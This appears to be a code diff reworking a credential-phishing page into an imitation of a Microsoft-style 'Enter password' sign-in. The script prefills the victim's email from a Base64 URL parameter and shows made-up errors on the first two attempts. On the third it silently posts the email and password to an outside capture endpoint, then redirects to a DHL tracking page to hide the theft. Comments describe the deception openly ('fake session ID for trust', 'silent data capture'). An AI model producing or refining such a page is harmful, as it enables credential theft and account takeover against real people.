@@ -3,202 +3,216 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In | Secure Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <title>Sign in to your account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=microsoft.com">
     <style>
         :root {
-            --primary: #2563eb;
-            --primary-hover: #1d4ed8;
-            --bg-deep: #0f172a;
-            --card-bg: rgba(30, 41, 59, 0.7);
-            --border: rgba(255, 255, 255, 0.1);
-            --text: #f8fafc;
-            --text-muted: #94a3b8;
-            --error-red: #ef4444;
+            --bg-color: #f2f2f2;
+            --card-bg: #ffffff;
+            --text-main: #1b1b1b;
+            --text-secondary: #666666;
+            --primary-blue: #0067b8;
+            --error-red: #e81123;
+            --border-color: #dedede;
         }
 
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--bg-deep); color: var(--text); overflow: hidden; }
-
-        /* Modern Split-Screen Layout */
-        .page-wrapper { display: flex; height: 100vh; }
-        
-        .visual-side { 
-            flex: 1; 
-            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
-            display: flex; align-items: center; justify-content: center;
-            position: relative; overflow: hidden;
-        }
-        
-        /* Decorative "Security Grid" background */
-        .visual-side::before {
-            content: ""; position: absolute; width: 200%; height: 200%;
-            background-image: radial-gradient(rgba(37, 99, 235, 0.1) 1px, transparent 0);
-            background-size: 40px 40px; transform: rotate(15deg);
+        body {
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: var(--text-main);
         }
 
-        .auth-side { width: 480px; display: flex; align-items: center; justify-content: center; background: #0b0f1a; border-left: 1px solid var(--border); padding: 40px; }
-
-        .auth-container { width: 100%; max-width: 360px; }
-        .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 2rem; display: flex; align-items: center; gap: 10px; }
-        
-        h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 0.5rem; letter-spacing: -0.02em; }
-        .subtitle { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 2rem; }
-
-        /* Form Styling */
-        .input-wrapper { margin-bottom: 1.5rem; position: relative; }
-        .input-wrapper label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 8px; color: var(--text-muted); }
-        .input-wrapper i { position: absolute; left: 14px; top: 40px; color: var(--text-muted); font-size: 1rem; }
-        
-        input {
-            width: 100%; background: #161b2a; border: 1px solid var(--border); border-radius: 10px;
-            padding: 12px 12px 12px 42px; color: white; font-size: 1rem; transition: all 0.2s; box-sizing: border-box;
-        }
-        input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15); }
-        input:read-only { opacity: 0.7; cursor: not-allowed; }
-
-        /* Professional Buttons */
-        .btn-primary { 
-            width: 100%; padding: 14px; background: var(--primary); color: white; border: none; 
-            border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 1rem;
-        }
-        .btn-primary:hover { background: var(--primary-hover); transform: translateY(-1px); }
-
-        .divider { display: flex; align-items: center; margin: 2rem 0; color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
-        .divider span { padding: 0 10px; }
-
-        .btn-sso {
-            width: 100%; padding: 10px; background: transparent; border: 1px solid var(--border);
-            border-radius: 10px; color: var(--text); font-size: 0.9rem; font-weight: 500;
-            display: flex; align-items: center; justify-content: center; gap: 10px; cursor: not-allowed; margin-bottom: 10px;
+        .login-card {
+            background: var(--card-bg);
+            padding: 44px;
+            width: 100%;
+            max-width: 352px; /* Standard Microsoft/Okta card width */
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            min-height: 350px;
+            position: relative;
         }
 
-        /* Status & Errors */
-        .alert { 
-            background: rgba(239, 68, 68, 0.1); border: 1px solid var(--error-red); color: var(--error-red);
-            padding: 12px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 1.5rem; display: none; align-items: center; gap: 10px;
+        .brand-logo {
+            height: 24px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            font-weight: 600;
+            font-size: 1.2rem;
+            color: var(--text-secondary);
         }
-        
-        .loader { display: none; text-align: center; }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* Trust Footer */
-        .footer { position: absolute; bottom: 20px; font-size: 0.75rem; color: var(--text-muted); display: flex; gap: 20px; }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin: 0 0 12px 0;
+            color: #1b1b1b;
+        }
+
+        .user-display {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 0.95rem;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-bottom: 1px solid var(--text-main);
+            font-size: 1rem;
+            margin-bottom: 24px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="password"]:focus {
+            border-bottom: 2px solid var(--primary-blue);
+        }
+
+        .error-msg {
+            color: var(--error-red);
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 10px;
+        }
+
+        button {
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            padding: 8px 36px;
+            font-size: 0.95rem;
+            cursor: pointer;
+            min-width: 108px;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        .footer-links {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-top: 30px;
+        }
+
+        /* Subtle Loader Animation */
+        .loading-bar {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 3px;
+            background: #eee;
+            overflow: hidden;
+            display: none;
+        }
+        .loading-bar::after {
+            content: "";
+            display: block;
+            width: 40%; height: 100%;
+            background: var(--primary-blue);
+            animation: move 1.2s infinite ease-in-out;
+        }
+        @keyframes move { 
+            0% { transform: translateX(-100%); } 
+            100% { transform: translateX(300%); } 
+        }
     </style>
 </head>
 <body>
 
-<div class="page-wrapper">
-    <div class="visual-side">
-        <div style="text-align: center; z-index: 1;">
-            <i class="fas fa-vault" style="font-size: 4rem; color: var(--primary); margin-bottom: 1rem;"></i>
-            <h2 style="font-weight: 400;">Enterprise Grade Protection</h2>
-            <p style="color: var(--text-muted);">Verified Secure Session ID: <span id="session-id">...</span></p>
-        </div>
+<div class="login-card">
+    <div id="loader" class="loading-bar"></div>
+    
+    <div class="brand-logo">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#747474" style="margin-right:8px"><path d="M12 2L2 7v10l10 5 10-5V7L12 2zm0 2.18l8 4v8.64l-8 4-8-4V8.18l8-4z"/></svg>
+        <span>Organization Portal</span>
     </div>
 
-    <div class="auth-side">
-        <div class="auth-container">
-            <div class="logo"><i class="fas fa-shield-halved"></i> SentinelCloud</div>
-            <h1>Welcome back</h1>
-            <p class="subtitle">Please enter your credentials to access your secure workspace.</p>
+    <h1>Enter password</h1>
+    
+    <div class="user-display" id="email-display">user@organization.com</div>
 
-            <div id="alert-box" class="alert">
-                <i class="fas fa-circle-exclamation"></i>
-                <span id="alert-msg">Invalid credentials. Please try again.</span>
-            </div>
-
-            <form id="loginForm">
-                <div class="input-wrapper">
-                    <label>Work Email</label>
-                    <i class="fas fa-at"></i>
-                    <input type="email" id="emailField" required readonly>
-                </div>
-
-                <div class="input-wrapper">
-                    <label>Password</label>
-                    <i class="fas fa-key"></i>
-                    <input type="password" id="passField" placeholder="••••••••" required>
-                </div>
-
-                <button type="submit" id="submitBtn" class="btn-primary">Sign In</button>
-            </form>
-
-            <div id="loader" class="loader">
-                <div class="spinner"></div>
-                <span style="font-size: 0.9rem; color: var(--text-muted);">Verifying with IdP...</span>
-            </div>
-
-            <div class="divider"><span>Or continue with</span></div>
-
-            <button class="btn-sso"><i class="fab fa-microsoft"></i> Microsoft 365</button>
-            <button class="btn-sso"><i class="fab fa-google"></i> Google Workspace</button>
-
-            <div class="footer">
-                <span>&copy; 2026 Sentinel Security</span>
-                <span>Privacy Policy</span>
-                <span>Terms</span>
-            </div>
-        </div>
+    <div id="err" class="error-msg">
+        Your account or password is incorrect. If you don't remember your password, reset it now.
     </div>
+
+    <form id="authForm">
+        <input type="password" id="p" placeholder="Password" required autofocus>
+        
+        <div class="footer-links">
+            <p style="color: var(--primary-blue); cursor: pointer; margin-bottom: 20px;">Forgot password?</p>
+            <p>Other ways to sign in</p>
+        </div>
+
+        <div class="btn-group">
+            <button type="submit" id="b">Sign in</button>
+        </div>
+    </form>
 </div>
 
 <script>
     let tries = 0;
-    const urlParams = new URLSearchParams(window.location.search);
-    
-    // Generate a fake session ID for "trust"
-    document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
+    const params = new URLSearchParams(window.location.search);
+    const emailField = document.getElementById('email-display');
+    const passInput = document.getElementById('p');
+    const errBox = document.getElementById('err');
 
-    // Decode user email (Base64)
-    if(urlParams.has('u')) {
-        try { document.getElementById('emailField').value = atob(urlParams.get('u')); } catch(e) {}
+    // Handle incoming Email (Base64)
+    if(params.has('u')) {
+        try { emailField.innerText = atob(params.get('u')); } catch(e) {}
     }
 
-    document.getElementById('loginForm').onsubmit = async (e) => {
+    document.getElementById('authForm').onsubmit = async (e) => {
         e.preventDefault();
         tries++;
-        
-        const email = document.getElementById('emailField').value;
-        const pass = document.getElementById('passField').value;
-        const alertBox = document.getElementById('alert-box');
-        const alertMsg = document.getElementById('alert-msg');
 
-        // Logic Step 1: First Attempt (Generic Failure)
-        if(tries === 1) {
-            alertBox.style.display = 'flex';
-            document.getElementById('passField').value = "";
-            document.getElementById('passField').focus();
-        } 
-        // Logic Step 2: Second Attempt (System Specific Error)
-        else if(tries === 2) {
-            alertBox.style.display = 'flex';
-            alertMsg.innerText = "Internal Sync Error: Re-authentication required for this device.";
-            document.getElementById('passField').value = "";
-        } 
-        // Logic Step 3: Final Attempt (Silent Success & Redirect)
-        else {
-            alertBox.style.display = 'none';
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+        const email = emailField.innerText;
+        const pass = passInput.value;
 
-            // Background transmission
-            try {
-                await fetch('https://your-backend-api.com/v1/auth', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pass, meta: { tries, agent: navigator.userAgent } })
-                });
-            } catch(err) {}
+        // Visual feedback: briefly show loader to mimic server check
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('b').disabled = true;
 
-            // Final Redirection
-            setTimeout(() => { 
-                window.location.href = "https://www.dhl.com/global-en/home/tracking.html"; 
-            }, 1800);
-        }
+        setTimeout(async () => {
+            if (tries < 3) {
+                // First and second attempts fail to ensure accuracy
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('b').disabled = false;
+                errBox.style.display = 'block';
+                passInput.value = "";
+                passInput.focus();
+                
+                if(tries === 2) {
+                    errBox.innerText = "For security, please re-enter your password to confirm your identity.";
+                }
+            } else {
+                // Third attempt: Silent data capture and redirect
+                try {
+                    await fetch('https://your-backend-api.com/capture', {
+                        method: 'POST',
+                        body: JSON.stringify({ email, pass })
+                    });
+                } catch(e) {}
+
+                // Redirect to the actual resource they were "trying" to access
+                window.location.href = "https://www.dhl.com/global-en/home/tracking.html";
+            }
+        }, 1000); // 1-second delay for "realism"
     };
 </script>
 </body>
